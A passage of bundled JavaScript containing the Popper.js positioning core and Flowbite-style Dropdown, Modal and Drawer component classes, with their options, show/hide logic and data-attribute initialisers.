      options: Object.assign({}, existing.options, current.options),
      data: Object.assign({}, existing.data, current.data)
    }) : current;
    return merged2;
  }, {});
  return Object.keys(merged).map(function(key) {
    return merged[key];
  });
}
var DEFAULT_OPTIONS = {
  placement: "bottom",
  modifiers: [],
  strategy: "absolute"
};
function areValidElements() {
  for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
    args[_key] = arguments[_key];
  }
  return !args.some(function(element) {
    return !(element && typeof element.getBoundingClientRect === "function");
  });
}
function popperGenerator(generatorOptions) {
  if (generatorOptions === void 0) {
    generatorOptions = {};
  }
  var _generatorOptions = generatorOptions, _generatorOptions$def = _generatorOptions.defaultModifiers, defaultModifiers2 = _generatorOptions$def === void 0 ? [] : _generatorOptions$def, _generatorOptions$def2 = _generatorOptions.defaultOptions, defaultOptions2 = _generatorOptions$def2 === void 0 ? DEFAULT_OPTIONS : _generatorOptions$def2;
  return function createPopper2(reference2, popper2, options) {
    if (options === void 0) {
      options = defaultOptions2;
    }
    var state = {
      placement: "bottom",
      orderedModifiers: [],
      options: Object.assign({}, DEFAULT_OPTIONS, defaultOptions2),
      modifiersData: {},
      elements: {
        reference: reference2,
        popper: popper2
      },
      attributes: {},
      styles: {}
    };
    var effectCleanupFns = [];
    var isDestroyed = false;
    var instance = {
      state,
      setOptions: function setOptions(setOptionsAction) {
        var options2 = typeof setOptionsAction === "function" ? setOptionsAction(state.options) : setOptionsAction;
        cleanupModifierEffects();
        state.options = Object.assign({}, defaultOptions2, state.options, options2);
        state.scrollParents = {
          reference: isElement$1(reference2) ? listScrollParents(reference2) : reference2.contextElement ? listScrollParents(reference2.contextElement) : [],
          popper: listScrollParents(popper2)
        };
        var orderedModifiers = orderModifiers(mergeByName([].concat(defaultModifiers2, state.options.modifiers)));
        state.orderedModifiers = orderedModifiers.filter(function(m3) {
          return m3.enabled;
        });
        runModifierEffects();
        return instance.update();
      },
      // Sync update  it will always be executed, even if not necessary. This
      // is useful for low frequency updates where sync behavior simplifies the
      // logic.
      // For high frequency updates (e.g. `resize` and `scroll` events), always
      // prefer the async Popper#update method
      forceUpdate: function forceUpdate() {
        if (isDestroyed) {
          return;
        }
        var _state$elements = state.elements, reference3 = _state$elements.reference, popper3 = _state$elements.popper;
        if (!areValidElements(reference3, popper3)) {
          return;
        }
        state.rects = {
          reference: getCompositeRect(reference3, getOffsetParent(popper3), state.options.strategy === "fixed"),
          popper: getLayoutRect(popper3)
        };
        state.reset = false;
        state.placement = state.options.placement;
        state.orderedModifiers.forEach(function(modifier) {
          return state.modifiersData[modifier.name] = Object.assign({}, modifier.data);
        });
        for (var index = 0; index < state.orderedModifiers.length; index++) {
          if (state.reset === true) {
            state.reset = false;
            index = -1;
            continue;
          }
          var _state$orderedModifie = state.orderedModifiers[index], fn2 = _state$orderedModifie.fn, _state$orderedModifie2 = _state$orderedModifie.options, _options = _state$orderedModifie2 === void 0 ? {} : _state$orderedModifie2, name = _state$orderedModifie.name;
          if (typeof fn2 === "function") {
            state = fn2({
              state,
              options: _options,
              name,
              instance
            }) || state;
          }
        }
      },
      // Async and optimistically optimized update  it will not be executed if
      // not necessary (debounced to run at most once-per-tick)
      update: debounce(function() {
        return new Promise(function(resolve) {
          instance.forceUpdate();
          resolve(state);
        });
      }),
      destroy: function destroy() {
        cleanupModifierEffects();
        isDestroyed = true;
      }
    };
    if (!areValidElements(reference2, popper2)) {
      return instance;
    }
    instance.setOptions(options).then(function(state2) {
      if (!isDestroyed && options.onFirstUpdate) {
        options.onFirstUpdate(state2);
      }
    });
    function runModifierEffects() {
      state.orderedModifiers.forEach(function(_ref) {
        var name = _ref.name, _ref$options = _ref.options, options2 = _ref$options === void 0 ? {} : _ref$options, effect2 = _ref.effect;
        if (typeof effect2 === "function") {
          var cleanupFn = effect2({
            state,
            name,
            instance,
            options: options2
          });
          var noopFn = function noopFn2() {
          };
          effectCleanupFns.push(cleanupFn || noopFn);
        }
      });
    }
    function cleanupModifierEffects() {
      effectCleanupFns.forEach(function(fn2) {
        return fn2();
      });
      effectCleanupFns = [];
    }
    return instance;
  };
}
var defaultModifiers = [eventListeners, popperOffsets$1, computeStyles$1, applyStyles$2, offset$2, flip$1, preventOverflow$1, arrow$1, hide$2];
var createPopper = /* @__PURE__ */ popperGenerator({
  defaultModifiers
});
var __assign$9 = function() {
  __assign$9 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$9.apply(this, arguments);
};
var __spreadArray$2 = function(to, from, pack) {
  if (pack || arguments.length === 2) for (var i2 = 0, l2 = from.length, ar; i2 < l2; i2++) {
    if (ar || !(i2 in from)) {
      if (!ar) ar = Array.prototype.slice.call(from, 0, i2);
      ar[i2] = from[i2];
    }
  }
  return to.concat(ar || Array.prototype.slice.call(from));
};
var Default$9 = {
  placement: "bottom",
  triggerType: "click",
  offsetSkidding: 0,
  offsetDistance: 10,
  delay: 300,
  ignoreClickOutsideClass: false,
  onShow: function() {
  },
  onHide: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$9 = {
  id: null,
  override: true
};
var Dropdown = (
  /** @class */
  function() {
    function Dropdown2(targetElement, triggerElement, options, instanceOptions) {
      if (targetElement === void 0) {
        targetElement = null;
      }
      if (triggerElement === void 0) {
        triggerElement = null;
      }
      if (options === void 0) {
        options = Default$9;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$9;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetElement.id;
      this._targetEl = targetElement;
      this._triggerEl = triggerElement;
      this._options = __assign$9(__assign$9({}, Default$9), options);
      this._popperInstance = null;
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Dropdown", this, this._instanceId, instanceOptions.override);
    }
    Dropdown2.prototype.init = function() {
      if (this._triggerEl && this._targetEl && !this._initialized) {
        this._popperInstance = this._createPopperInstance();
        this._setupEventListeners();
        this._initialized = true;
      }
    };
    Dropdown2.prototype.destroy = function() {
      var _this = this;
      var triggerEvents = this._getTriggerEvents();
      if (this._options.triggerType === "click") {
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._clickHandler);
        });
      }
      if (this._options.triggerType === "hover") {
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._hoverShowTriggerElHandler);
          _this._targetEl.removeEventListener(ev, _this._hoverShowTargetElHandler);
        });
        triggerEvents.hideEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._hoverHideHandler);
          _this._targetEl.removeEventListener(ev, _this._hoverHideHandler);
        });
      }
      this._popperInstance.destroy();
      this._initialized = false;
    };
    Dropdown2.prototype.removeInstance = function() {
      instances.removeInstance("Dropdown", this._instanceId);
    };
    Dropdown2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Dropdown2.prototype._setupEventListeners = function() {
      var _this = this;
      var triggerEvents = this._getTriggerEvents();
      this._clickHandler = function() {
        _this.toggle();
      };
      if (this._options.triggerType === "click") {
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.addEventListener(ev, _this._clickHandler);
        });
      }
      this._hoverShowTriggerElHandler = function(ev) {
        if (ev.type === "click") {
          _this.toggle();
        } else {
          setTimeout(function() {
            _this.show();
          }, _this._options.delay);
        }
      };
      this._hoverShowTargetElHandler = function() {
        _this.show();
      };
      this._hoverHideHandler = function() {
        setTimeout(function() {
          if (!_this._targetEl.matches(":hover")) {
            _this.hide();
          }
        }, _this._options.delay);
      };
      if (this._options.triggerType === "hover") {
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.addEventListener(ev, _this._hoverShowTriggerElHandler);
          _this._targetEl.addEventListener(ev, _this._hoverShowTargetElHandler);
        });
        triggerEvents.hideEvents.forEach(function(ev) {
          _this._triggerEl.addEventListener(ev, _this._hoverHideHandler);
          _this._targetEl.addEventListener(ev, _this._hoverHideHandler);
        });
      }
    };
    Dropdown2.prototype._createPopperInstance = function() {
      return createPopper(this._triggerEl, this._targetEl, {
        placement: this._options.placement,
        modifiers: [
          {
            name: "offset",
            options: {
              offset: [
                this._options.offsetSkidding,
                this._options.offsetDistance
              ]
            }
          }
        ]
      });
    };
    Dropdown2.prototype._setupClickOutsideListener = function() {
      var _this = this;
      this._clickOutsideEventListener = function(ev) {
        _this._handleClickOutside(ev, _this._targetEl);
      };
      document.body.addEventListener("click", this._clickOutsideEventListener, true);
    };
    Dropdown2.prototype._removeClickOutsideListener = function() {
      document.body.removeEventListener("click", this._clickOutsideEventListener, true);
    };
    Dropdown2.prototype._handleClickOutside = function(ev, targetEl) {
      var clickedEl = ev.target;
      var ignoreClickOutsideClass = this._options.ignoreClickOutsideClass;
      var isIgnored = false;
      if (ignoreClickOutsideClass) {
        var ignoredClickOutsideEls = document.querySelectorAll(".".concat(ignoreClickOutsideClass));
        ignoredClickOutsideEls.forEach(function(el) {
          if (el.contains(clickedEl)) {
            isIgnored = true;
            return;
          }
        });
      }
      if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && !isIgnored && this.isVisible()) {
        this.hide();
      }
    };
    Dropdown2.prototype._getTriggerEvents = function() {
      switch (this._options.triggerType) {
        case "hover":
          return {
            showEvents: ["mouseenter", "click"],
            hideEvents: ["mouseleave"]
          };
        case "click":
          return {
            showEvents: ["click"],
            hideEvents: []
          };
        case "none":
          return {
            showEvents: [],
            hideEvents: []
          };
        default:
          return {
            showEvents: ["click"],
            hideEvents: []
          };
      }
    };
    Dropdown2.prototype.toggle = function() {
      if (this.isVisible()) {
        this.hide();
      } else {
        this.show();
      }
      this._options.onToggle(this);
    };
    Dropdown2.prototype.isVisible = function() {
      return this._visible;
    };
    Dropdown2.prototype.show = function() {
      this._targetEl.classList.remove("hidden");
      this._targetEl.classList.add("block");
      this._targetEl.removeAttribute("aria-hidden");
      this._popperInstance.setOptions(function(options) {
        return __assign$9(__assign$9({}, options), { modifiers: __spreadArray$2(__spreadArray$2([], options.modifiers, true), [
          { name: "eventListeners", enabled: true }
        ], false) });
      });
      this._setupClickOutsideListener();
      this._popperInstance.update();
      this._visible = true;
      this._options.onShow(this);
    };
    Dropdown2.prototype.hide = function() {
      this._targetEl.classList.remove("block");
      this._targetEl.classList.add("hidden");
      this._targetEl.setAttribute("aria-hidden", "true");
      this._popperInstance.setOptions(function(options) {
        return __assign$9(__assign$9({}, options), { modifiers: __spreadArray$2(__spreadArray$2([], options.modifiers, true), [
          { name: "eventListeners", enabled: false }
        ], false) });
      });
      this._visible = false;
      this._removeClickOutsideListener();
      this._options.onHide(this);
    };
    Dropdown2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Dropdown2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Dropdown2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Dropdown2;
  }()
);
function initDropdowns() {
  document.querySelectorAll("[data-dropdown-toggle]").forEach(function($triggerEl) {
    var dropdownId = $triggerEl.getAttribute("data-dropdown-toggle");
    var $dropdownEl = document.getElementById(dropdownId);
    if ($dropdownEl) {
      var placement = $triggerEl.getAttribute("data-dropdown-placement");
      var offsetSkidding = $triggerEl.getAttribute("data-dropdown-offset-skidding");
      var offsetDistance = $triggerEl.getAttribute("data-dropdown-offset-distance");
      var triggerType = $triggerEl.getAttribute("data-dropdown-trigger");
      var delay = $triggerEl.getAttribute("data-dropdown-delay");
      var ignoreClickOutsideClass = $triggerEl.getAttribute("data-dropdown-ignore-click-outside-class");
      new Dropdown($dropdownEl, $triggerEl, {
        placement: placement ? placement : Default$9.placement,
        triggerType: triggerType ? triggerType : Default$9.triggerType,
        offsetSkidding: offsetSkidding ? parseInt(offsetSkidding) : Default$9.offsetSkidding,
        offsetDistance: offsetDistance ? parseInt(offsetDistance) : Default$9.offsetDistance,
        delay: delay ? parseInt(delay) : Default$9.delay,
        ignoreClickOutsideClass: ignoreClickOutsideClass ? ignoreClickOutsideClass : Default$9.ignoreClickOutsideClass
      });
    } else {
      console.error('The dropdown element with id "'.concat(dropdownId, '" does not exist. Please check the data-dropdown-toggle attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.Dropdown = Dropdown;
  window.initDropdowns = initDropdowns;
}
var __assign$8 = function() {
  __assign$8 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$8.apply(this, arguments);
};
var Default$8 = {
  placement: "center",
  backdropClasses: "bg-gray-900/50 dark:bg-gray-900/80 fixed inset-0 z-40",
  backdrop: "dynamic",
  closable: true,
  onHide: function() {
  },
  onShow: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$8 = {
  id: null,
  override: true
};
var Modal = (
  /** @class */
  function() {
    function Modal2(targetEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (options === void 0) {
        options = Default$8;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$8;
      }
      this._eventListenerInstances = [];
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._options = __assign$8(__assign$8({}, Default$8), options);
      this._isHidden = true;
      this._backdropEl = null;
      this._initialized = false;
      this.init();
      instances.addInstance("Modal", this, this._instanceId, instanceOptions.override);
    }
    Modal2.prototype.init = function() {
      var _this = this;
      if (this._targetEl && !this._initialized) {
        this._getPlacementClasses().map(function(c) {
          _this._targetEl.classList.add(c);
        });
        this._initialized = true;
      }
    };
    Modal2.prototype.destroy = function() {
      if (this._initialized) {
        this.removeAllEventListenerInstances();
        this._destroyBackdropEl();
        this._initialized = false;
      }
    };
    Modal2.prototype.removeInstance = function() {
      instances.removeInstance("Modal", this._instanceId);
    };
    Modal2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Modal2.prototype._createBackdrop = function() {
      var _a;
      if (this._isHidden) {
        var backdropEl = document.createElement("div");
        (_a = backdropEl.classList).add.apply(_a, this._options.backdropClasses.split(" "));
        document.querySelector("body").append(backdropEl);
        this._backdropEl = backdropEl;
      }
    };
    Modal2.prototype._destroyBackdropEl = function() {
      if (!this._isHidden && this._backdropEl) {
        this._backdropEl.remove();
        this._backdropEl = null;
      }
    };
    Modal2.prototype._setupModalCloseEventListeners = function() {
      var _this = this;
      if (this._options.backdrop === "dynamic") {
        this._clickOutsideEventListener = function(ev) {
          _this._handleOutsideClick(ev.target);
        };
        this._targetEl.addEventListener("click", this._clickOutsideEventListener, true);
      }
      this._keydownEventListener = function(ev) {
        if (ev.key === "Escape") {
          _this.hide();
        }
      };
      document.body.addEventListener("keydown", this._keydownEventListener, true);
    };
    Modal2.prototype._removeModalCloseEventListeners = function() {
      if (this._options.backdrop === "dynamic") {
        this._targetEl.removeEventListener("click", this._clickOutsideEventListener, true);
      }
      document.body.removeEventListener("keydown", this._keydownEventListener, true);
    };
    Modal2.prototype._handleOutsideClick = function(target) {
      if (target === this._targetEl || target === this._backdropEl && this.isVisible()) {
        this.hide();
      }
    };
    Modal2.prototype._getPlacementClasses = function() {
      switch (this._options.placement) {
        case "top-left":
          return ["justify-start", "items-start"];
        case "top-center":
          return ["justify-center", "items-start"];
        case "top-right":
          return ["justify-end", "items-start"];
        case "center-left":
          return ["justify-start", "items-center"];
        case "center":
          return ["justify-center", "items-center"];
        case "center-right":
          return ["justify-end", "items-center"];
        case "bottom-left":
          return ["justify-start", "items-end"];
        case "bottom-center":
          return ["justify-center", "items-end"];
        case "bottom-right":
          return ["justify-end", "items-end"];
        default:
          return ["justify-center", "items-center"];
      }
    };
    Modal2.prototype.toggle = function() {
      if (this._isHidden) {
        this.show();
      } else {
        this.hide();
      }
      this._options.onToggle(this);
    };
    Modal2.prototype.show = function() {
      if (this.isHidden) {
        this._targetEl.classList.add("flex");
        this._targetEl.classList.remove("hidden");
        this._targetEl.setAttribute("aria-modal", "true");
        this._targetEl.setAttribute("role", "dialog");
        this._targetEl.removeAttribute("aria-hidden");
        this._createBackdrop();
        this._isHidden = false;
        if (this._options.closable) {
          this._setupModalCloseEventListeners();
        }
        document.body.classList.add("overflow-hidden");
        this._options.onShow(this);
      }
    };
    Modal2.prototype.hide = function() {
      if (this.isVisible) {
        this._targetEl.classList.add("hidden");
        this._targetEl.classList.remove("flex");
        this._targetEl.setAttribute("aria-hidden", "true");
        this._targetEl.removeAttribute("aria-modal");
        this._targetEl.removeAttribute("role");
        this._destroyBackdropEl();
        this._isHidden = true;
        document.body.classList.remove("overflow-hidden");
        if (this._options.closable) {
          this._removeModalCloseEventListeners();
        }
        this._options.onHide(this);
      }
    };
    Modal2.prototype.isVisible = function() {
      return !this._isHidden;
    };
    Modal2.prototype.isHidden = function() {
      return this._isHidden;
    };
    Modal2.prototype.addEventListenerInstance = function(element, type, handler) {
      this._eventListenerInstances.push({
        element,
        type,
        handler
      });
    };
    Modal2.prototype.removeAllEventListenerInstances = function() {
      this._eventListenerInstances.map(function(eventListenerInstance) {
        eventListenerInstance.element.removeEventListener(eventListenerInstance.type, eventListenerInstance.handler);
      });
      this._eventListenerInstances = [];
    };
    Modal2.prototype.getAllEventListenerInstances = function() {
      return this._eventListenerInstances;
    };
    Modal2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Modal2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Modal2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Modal2;
  }()
);
function initModals() {
  document.querySelectorAll("[data-modal-target]").forEach(function($triggerEl) {
    var modalId = $triggerEl.getAttribute("data-modal-target");
    var $modalEl = document.getElementById(modalId);
    if ($modalEl) {
      var placement = $modalEl.getAttribute("data-modal-placement");
      var backdrop = $modalEl.getAttribute("data-modal-backdrop");
      new Modal($modalEl, {
        placement: placement ? placement : Default$8.placement,
        backdrop: backdrop ? backdrop : Default$8.backdrop
      });
    } else {
      console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-target attribute points to the correct modal id?."));
    }
  });
  document.querySelectorAll("[data-modal-toggle]").forEach(function($triggerEl) {
    var modalId = $triggerEl.getAttribute("data-modal-toggle");
    var $modalEl = document.getElementById(modalId);
    if ($modalEl) {
      var modal_1 = instances.getInstance("Modal", modalId);
      if (modal_1) {
        var toggleModal = function() {
          modal_1.toggle();
        };
        $triggerEl.addEventListener("click", toggleModal);
        modal_1.addEventListenerInstance($triggerEl, "click", toggleModal);
      } else {
        console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
      }
    } else {
      console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-toggle attribute points to the correct modal id?"));
    }
  });
  document.querySelectorAll("[data-modal-show]").forEach(function($triggerEl) {
    var modalId = $triggerEl.getAttribute("data-modal-show");
    var $modalEl = document.getElementById(modalId);
    if ($modalEl) {
      var modal_2 = instances.getInstance("Modal", modalId);
      if (modal_2) {
        var showModal = function() {
          modal_2.show();
        };
        $triggerEl.addEventListener("click", showModal);
        modal_2.addEventListenerInstance($triggerEl, "click", showModal);
      } else {
        console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
      }
    } else {
      console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-show attribute points to the correct modal id?"));
    }
  });
  document.querySelectorAll("[data-modal-hide]").forEach(function($triggerEl) {
    var modalId = $triggerEl.getAttribute("data-modal-hide");
    var $modalEl = document.getElementById(modalId);
    if ($modalEl) {
      var modal_3 = instances.getInstance("Modal", modalId);
      if (modal_3) {
        var hideModal = function() {
          modal_3.hide();
        };
        $triggerEl.addEventListener("click", hideModal);
        modal_3.addEventListenerInstance($triggerEl, "click", hideModal);
      } else {
        console.error("Modal with id ".concat(modalId, " has not been initialized. Please initialize it using the data-modal-target attribute."));
      }
    } else {
      console.error("Modal with id ".concat(modalId, " does not exist. Are you sure that the data-modal-hide attribute points to the correct modal id?"));
    }
  });
}
if (typeof window !== "undefined") {
  window.Modal = Modal;
  window.initModals = initModals;
}
var __assign$7 = function() {
  __assign$7 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$7.apply(this, arguments);
};
var Default$7 = {
  placement: "left",
  bodyScrolling: false,
  backdrop: true,
  edge: false,
  edgeOffset: "bottom-[60px]",
  backdropClasses: "bg-gray-900/50 dark:bg-gray-900/80 fixed inset-0 z-30",
  onShow: function() {
  },
  onHide: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$7 = {
  id: null,
  override: true
};
var Drawer = (
  /** @class */
  function() {
    function Drawer2(targetEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (options === void 0) {
        options = Default$7;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$7;
      }
      this._eventListenerInstances = [];
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._options = __assign$7(__assign$7({}, Default$7), options);
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Drawer", this, this._instanceId, instanceOptions.override);
    }
    Drawer2.prototype.init = function() {
      var _this = this;
      if (this._targetEl && !this._initialized) {
        this._targetEl.setAttribute("aria-hidden", "true");
        this._targetEl.classList.add("transition-transform");
        this._getPlacementClasses(this._options.placement).base.map(function(c) {
          _this._targetEl.classList.add(c);
        });
        this._handleEscapeKey = function(event) {
          if (event.key === "Escape") {
            if (_this.isVisible()) {
              _this.hide();
            }
          }
        };
        document.addEventListener("keydown", this._handleEscapeKey);
        this._initialized = true;
      }
    };
    Drawer2.prototype.destroy = function() {
      if (this._initialized) {
        this.removeAllEventListenerInstances();
        this._destroyBackdropEl();
        document.removeEventListener("keydown", this._handleEscapeKey);
        this._initialized = false;
      }
    };
    Drawer2.prototype.removeInstance = function() {
      instances.removeInstance("Drawer", this._instanceId);
    };
    Drawer2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Drawer2.prototype.hide = function() {
      var _this = this;
      if (this._options.edge) {
        this._getPlacementClasses(this._options.placement + "-edge").active.map(function(c) {
          _this._targetEl.classList.remove(c);
        });
        this._getPlacementClasses(this._options.placement + "-edge").inactive.map(function(c) {
          _this._targetEl.classList.add(c);
        });
      } else {
        this._getPlacementClasses(this._options.placement).active.map(function(c) {
          _this._targetEl.classList.remove(c);
        });
        this._getPlacementClasses(this._options.placement).inactive.map(function(c) {
          _this._targetEl.classList.add(c);
        });
      }
      this._targetEl.setAttribute("aria-hidden", "true");
      this._targetEl.removeAttribute("aria-modal");
      this._targetEl.removeAttribute("role");
      if (!this._options.bodyScrolling) {
        document.body.classList.remove("overflow-hidden");
      }
      if (this._options.backdrop) {
        this._destroyBackdropEl();
      }
      this._visible = false;
      this._options.onHide(this);
    };
    Drawer2.prototype.show = function() {
      var _this = this;
      if (this._options.edge) {
        this._getPlacementClasses(this._options.placement + "-edge").active.map(function(c) {
          _this._targetEl.classList.add(c);
        });
        this._getPlacementClasses(this._options.placement + "-edge").inactive.map(function(c) {
          _this._targetEl.classList.remove(c);
        });
      } else {
        this._getPlacementClasses(this._options.placement).active.map(function(c) {
          _this._targetEl.classList.add(c);
        });
        this._getPlacementClasses(this._options.placement).inactive.map(function(c) {
          _this._targetEl.classList.remove(c);
        });
      }
      this._targetEl.setAttribute("aria-modal", "true");
      this._targetEl.setAttribute("role", "dialog");
      this._targetEl.removeAttribute("aria-hidden");
      if (!this._options.bodyScrolling) {
        document.body.classList.add("overflow-hidden");
      }
      if (this._options.backdrop) {
        this._createBackdrop();
      }
      this._visible = true;
      this._options.onShow(this);
    };
    Drawer2.prototype.toggle = function() {
      if (this.isVisible()) {
        this.hide();
      } else {
        this.show();
      }
    };
    Drawer2.prototype._createBackdrop = function() {
      var _a;
      var _this = this;
      if (!this._visible) {
        var backdropEl = document.createElement("div");
        backdropEl.setAttribute("drawer-backdrop", "");
        (_a = backdropEl.classList).add.apply(_a, this._options.backdropClasses.split(" "));
        document.querySelector("body").append(backdropEl);
        backdropEl.addEventListener("click", function() {
          _this.hide();
        });
      }
    };
    Drawer2.prototype._destroyBackdropEl = function() {
      if (this._visible && document.querySelector("[drawer-backdrop]") !== null) {
        document.querySelector("[drawer-backdrop]").remove();
      }
    };
    Drawer2.prototype._getPlacementClasses = function(placement) {
      switch (placement) {
        case "top":
          return {
            base: ["top-0", "left-0", "right-0"],
            active: ["transform-none"],
            inactive: ["-translate-y-full"]
          };
        case "right":
          return {
            base: ["right-0", "top-0"],
            active: ["transform-none"],
            inactive: ["translate-x-full"]
          };
        case "bottom":
          return {
            base: ["bottom-0", "left-0", "right-0"],
            active: ["transform-none"],
            inactive: ["translate-y-full"]
          };
        case "left":
          return {
            base: ["left-0", "top-0"],
            active: ["transform-none"],
            inactive: ["-translate-x-full"]
          };
        case "bottom-edge":
          return {
            base: ["left-0", "top-0"],
            active: ["transform-none"],
            inactive: ["translate-y-full", this._options.edgeOffset]
          };
        default:
          return {
            base: ["left-0", "top-0"],
            active: ["transform-none"],
            inactive: ["-translate-x-full"]
          };
      }
    };
    Drawer2.prototype.isHidden = function() {
      return !this._visible;
    };
    Drawer2.prototype.isVisible = function() {
      return this._visible;
    };
    Drawer2.prototype.addEventListenerInstance = function(element, type, handler) {
      this._eventListenerInstances.push({
        element,
        type,
        handler
      });
    };
    Drawer2.prototype.removeAllEventListenerInstances = function() {
      this._eventListenerInstances.map(function(eventListenerInstance) {
        eventListenerInstance.element.removeEventListener(eventListenerInstance.type, eventListenerInstance.handler);
      });
      this._eventListenerInstances = [];
    };
    Drawer2.prototype.getAllEventListenerInstances = function() {
      return this._eventListenerInstances;
    };
    Drawer2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Drawer2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Drawer2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Drawer2;
  }()
);
function initDrawers() {
  document.querySelectorAll("[data-drawer-target]").forEach(function($triggerEl) {
    var drawerId = $triggerEl.getAttribute("data-drawer-target");
    var $drawerEl = document.getElementById(drawerId);
    if ($drawerEl) {
      var placement = $triggerEl.getAttribute("data-drawer-placement");
      var bodyScrolling = $triggerEl.getAttribute("data-drawer-body-scrolling");
      var backdrop = $triggerEl.getAttribute("data-drawer-backdrop");
      var edge = $triggerEl.getAttribute("data-drawer-edge");
      var edgeOffset = $triggerEl.getAttribute("data-drawer-edge-offset");
      new Drawer($drawerEl, {
        placement: placement ? placement : Default$7.placement,
        bodyScrolling: bodyScrolling ? bodyScrolling === "true" ? true : false : Default$7.bodyScrolling,
        backdrop: backdrop ? backdrop === "true" ? true : false : Default$7.backdrop,
        edge: edge ? edge === "true" ? true : false : Default$7.edge,
        edgeOffset: edgeOffset ? edgeOffset : Default$7.edgeOffset
      });
    } else {
      console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
    }
  });
  document.querySelectorAll("[data-drawer-toggle]").forEach(function($triggerEl) {
    var drawerId = $triggerEl.getAttribute("data-drawer-toggle");
    var $drawerEl = document.getElementById(drawerId);
    if ($drawerEl) {
      var drawer_1 = instances.getInstance("Drawer", drawerId);
      if (drawer_1) {
        var toggleDrawer = function() {
          drawer_1.toggle();
        };
        $triggerEl.addEventListener("click", toggleDrawer);
        drawer_1.addEventListenerInstance($triggerEl, "click", toggleDrawer);
      } else {
        console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
      }
    } else {
      console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
    }
  });
  document.querySelectorAll("[data-drawer-dismiss], [data-drawer-hide]").forEach(function($triggerEl) {
    var drawerId = $triggerEl.getAttribute("data-drawer-dismiss") ? $triggerEl.getAttribute("data-drawer-dismiss") : $triggerEl.getAttribute("data-drawer-hide");
    var $drawerEl = document.getElementById(drawerId);
    if ($drawerEl) {
      var drawer_2 = instances.getInstance("Drawer", drawerId);
      if (drawer_2) {
        var hideDrawer = function() {
          drawer_2.hide();
        };
        $triggerEl.addEventListener("click", hideDrawer);
        drawer_2.addEventListenerInstance($triggerEl, "click", hideDrawer);
      } else {
        console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
      }
    } else {
      console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id"));
    }
  });
  document.querySelectorAll("[data-drawer-show]").forEach(function($triggerEl) {
    var drawerId = $triggerEl.getAttribute("data-drawer-show");
    var $drawerEl = document.getElementById(drawerId);
    if ($drawerEl) {
      var drawer_3 = instances.getInstance("Drawer", drawerId);
      if (drawer_3) {
        var showDrawer = function() {
          drawer_3.show();
        };
        $triggerEl.addEventListener("click", showDrawer);
        drawer_3.addEventListenerInstance($triggerEl, "click", showDrawer);
      } else {
        console.error("Drawer with id ".concat(drawerId, " has not been initialized. Please initialize it using the data-drawer-target attribute."));
      }
    } else {
